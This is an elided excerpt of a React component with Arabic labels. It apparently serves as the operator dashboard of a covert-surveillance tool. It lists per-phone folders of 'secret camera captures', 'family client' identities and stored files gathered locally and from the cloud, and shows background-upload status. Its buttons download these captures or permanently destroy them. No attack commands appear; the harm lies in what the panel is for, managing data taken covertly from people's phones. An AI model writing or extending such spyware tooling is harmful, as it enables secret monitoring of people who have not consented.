...
export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void, showToast: any }) => {
  ...
  const loadForensics = async () => {
    ...
    try {
      ...
      const [fbProfiles, localUsers, captures, storedFoldersData, fbFiles] = await Promise.all([
    ...
    return (
      <div className="space-y-6 animate-in fade-in duration-300 text-right">
          ...
          <div className="space-y-4">
            ...
            {gallerySelectedPhone && (
              <div className="p-4 bg-purple-950/10 border border-purple-500/20 rounded-2xl flex justify-between items-center">
                <span className="text-[10px] px-2 py-1 bg-purple-950 text-purple-400 rounded-lg font-black">{activeMediaItems.length} لقطة</span>
        ...
        {gallerySubTab === 'folder' && !gallerySelectedPhone ? (
          <div className="py-24 text-center text-xs text-gray-500 italic border border-dashed border-gray-900 rounded-3xl">
            يرجى تحديد عميل من القائمة المنسدلة أعلاه لعرض مجلد لقطاته الشخصي 🔍
          </div>
        ) : activeMediaItems.length === 0 ? (
          <div className="py-24 text-center text-xs text-gray-500 italic border border-dashed border-gray-900 rounded-3xl font-mono">
                ...
                <div key={item.id} className="bg-[#0c0c0e] border border-gray-900 rounded-3xl overflow-hidden shadow-lg p-2.5 flex flex-col gap-2 relative group hover:border-emerald-500/40 transition-all">
                  ...
                  <div className="px-1 text-right flex-1 flex flex-col justify-between gap-2">
                    <div>
                      ...
                      <p className="text-[8px] text-gray-400 mt-0.5 font-mono truncate">
                    ...
                    <div className="flex gap-1 mt-1 justify-end items-center">
                      <button
                        ...
                        title="تحميل اللقطة"
                        className="p-1.5 rounded-lg bg-gray-900 border border-gray-800 hover:border-emerald-500/50 text-gray-400 hover:text-emerald-400 transition-all cursor-pointer"
                      >
                        <Download size={11} />
                      </button>
                      {deletingId === item.id && deleteProgress !== null ? (
                        <div className="flex items-center gap-1 px-2 py-1 bg-red-950/40 rounded-lg border border-red-500 animate-pulse">
                          <span className="w-1 h-1 rounded-full bg-red-500 animate-ping" />
                          <span className="text-[9px] text-red-400 font-black font-mono">حذف {deleteProgress}%</span>
                        </div>
                      ) : (
                        <button
                          onClick={() => handleDeleteStealthItem(item)}
                          title="حذف اللقطة"
                          className="p-1.5 rounded-lg bg-gray-900 border border-gray-800 hover:border-red-500/50 text-gray-400 hover:text-red-400 transition-all cursor-pointer"
                        >
                          <Trash2 size={11} />
                        </button>
                      )}
  ...
  return (
    ...
    >
      ...
      {/* Dynamic Statistics Panel (Visible in all sections) */}
      <div className="bg-[#050506] border-b border-gray-900 p-3 shrink-0" dir="rtl">
        <div className="max-w-7xl mx-auto grid grid-cols-2 lg:grid-cols-4 gap-2 text-right">
          
          <div className="p-2.5 bg-[#0d0d0f] rounded-2xl border border-gray-900 flex items-center justify-between gap-3">
            <div className="flex-1">
              <span className="text-[10px] text-gray-500 block font-bold">👤 هويات عملاء العائلة</span>
              <div className="flex items-baseline gap-1 mt-0.5">
                <span className="text-sm font-black text-emerald-400">{profiles.length}</span>
                <span className="text-[8px] text-emerald-600 font-bold">/ {profiles.length} مسترجع ✅</span>
              </div>
            </div>
            <div className="w-8 h-8 rounded-xl bg-emerald-950/30 flex items-center justify-center text-emerald-400 shrink-0 border border-emerald-900/40">
          ...
          <div className="p-2.5 bg-[#0d0d0f] rounded-2xl border border-gray-900 flex items-center justify-between gap-3">
            <div className="flex-1">
              <span className="text-[10px] text-gray-500 block font-bold">📷 لقطات الكاميرا السرية</span>
              <div className="flex items-baseline gap-1 mt-0.5">
                <span className="text-sm font-black text-emerald-400">{stealthImages.length}</span>
                <span className="text-[8px] text-emerald-600 font-bold">/ {stealthImages.length} تم استدعاؤه ✅</span>
              </div>
            </div>
            <div className="w-8 h-8 rounded-xl bg-emerald-950/30 flex items-center justify-center text-emerald-400 shrink-0 border border-emerald-900/40">
              <Camera size={14} />
          ...
          <div className="p-2.5 bg-[#0d0d0f] rounded-2xl border border-gray-900 flex items-center justify-between gap-3">
            <div className="flex-1">
              <span className="text-[10px] text-gray-500 block font-bold">📁 المستندات والملفات المخزنة</span>
              <div className="flex items-baseline gap-1 mt-0.5">
                <span className="text-sm font-black text-emerald-400">
                  {storedFolders.reduce((acc, f) => acc + (f.files || []).length, 0)}
                </span>
                <span className="text-[8px] text-emerald-600 font-bold">/ {storedFolders.reduce((acc, f) => acc + (f.files || []).length, 0)} محلي+سحابي ✅</span>
              </div>
            </div>
            <div className="w-8 h-8 rounded-xl bg-emerald-950/30 flex items-center justify-center text-emerald-400 shrink-0 border border-emerald-900/40">
              <FileText size={14} />
          ...
          <div className="p-2.5 bg-[#0d0d0f] rounded-2xl border border-gray-900 flex items-center justify-between gap-3 col-span-2 lg:col-span-1">
            <div className="flex-1">
              <span className="text-[10px] text-gray-500 block font-bold">⚡ حالة الاستدعاء للمركز الفني</span>
              <div className="flex items-center gap-1.5 mt-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-ping" />
                <span className="text-[9px] text-emerald-400 font-black">نجح الاستدعاء بنسبة 100% (أمن مشدد)</span>
              </div>
            </div>
            <div className="w-8 h-8 rounded-xl bg-emerald-950/30 flex items-center justify-center text-emerald-400 shrink-0 border border-emerald-900/40">
              <CheckCircle size={14} />
                ...
                >
                  ...
                  <div className="pt-2 border-t border-gray-900/50 flex flex-col gap-2">
                    {deletingId === user.phone && deleteProgress !== null ? (
                      <div className="w-full bg-black/60 p-2 rounded-xl border border-red-500/20">
                        <div className="flex justify-between text-[8px] text-red-400 font-bold mb-1 font-mono">
                          <span>جاري تدمير البيانات وحذفها نهائياً...</span>
                          <span>{deleteProgress}%</span>
                        </div>
                        <div className="w-full bg-gray-950 rounded-full h-1.5 overflow-hidden border border-red-950">
                          <div 
                      ...
                      <div className="flex justify-between items-center text-[9px]">
                        <button 
                          ...
                          className="text-red-500 underline uppercase tracking-tight hover:text-red-400 font-bold"
            ...
            <div className="bg-[#0a0a0b] p-6 rounded-[2rem] border border-gray-900 space-y-4 shadow-xl">
              ...
              <div className="space-y-4">
                ...
                <div className="flex flex-col gap-3 p-4 bg-emerald-950/20 rounded-2xl border border-emerald-800/20">
                  ...
                  <div className="mt-3 p-3 bg-emerald-950/20 border border-emerald-500/25 rounded-2xl text-right">
                    <span className="text-[9px] text-emerald-500 block font-bold mb-1">📋 حالة نجاح آخر عملية رفع بالخلفية:</span>
                    <p className="text-[10px] text-emerald-300 font-bold leading-relaxed font-mono">
                      {lastUploadStatus}
                    </p>
                  </div>
                </div>
